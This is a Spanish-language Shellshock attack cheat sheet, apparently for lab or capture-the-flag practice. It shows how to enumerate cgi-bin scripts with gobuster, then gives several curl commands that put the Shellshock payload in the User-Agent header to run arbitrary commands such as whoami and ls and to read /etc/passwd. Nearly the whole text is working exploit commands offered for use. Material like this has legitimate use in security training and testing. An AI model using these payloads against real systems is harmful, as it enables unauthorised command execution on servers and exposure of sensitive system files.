---

### 💣 **Shellshock Attack Cheat Sheet** 💣

---
---
## **Exploración Inicial: Detectando el directorio cgi-bin**

Antes de explotar la vulnerabilidad, es fundamental detectar el directorio **cgi-bin** y los archivos que contiene:  
```bash
gobuster dir -u http://localhost/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x pl,sh,cgi -v
```
- **Extensiones comunes:** `.pl`, `.sh`, `.cgi`  
- **Objetivo:** Encontrar archivos que se puedan explotar.  

---

## **Payloads para Explotación usando curl**

Una vez identificado un archivo dentro de **cgi-bin**, intenta ejecutar comandos mediante el encabezado **User-Agent**:  

### **Ejecutando Comandos en el Servidor**
```bash
curl -s http://localhost/cgi-bin/status -H "User-Agent: () { :; }; /usr/bin/whoami"
```
- 💡 **Explicación:** El encabezado **User-Agent** contiene el payload que ejecuta el comando `whoami`.

---

### **Payload Alternativo con Echo**
Si el payload anterior no muestra nada, intenta agregar un **echo** antes:  
```bash
curl -s http://localhost/cgi-bin/status -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
```
- **Explicación:** El uso de `echo` puede forzar una respuesta más clara si el servidor no muestra la salida directamente.  

---

### **Otros Comandos para Verificar la Vulnerabilidad**
```bash
curl -s http://localhost/cgi-bin/status -H "User-Agent: () { :; }; /bin/ls"
curl -s http://localhost/cgi-bin/status -H "User-Agent: () { :; }; echo; /bin/cat /etc/passwd"
```
- **Objetivo:** Verificar la ejecución de comandos arbitrarios y la posibilidad de leer archivos sensibles.  

---
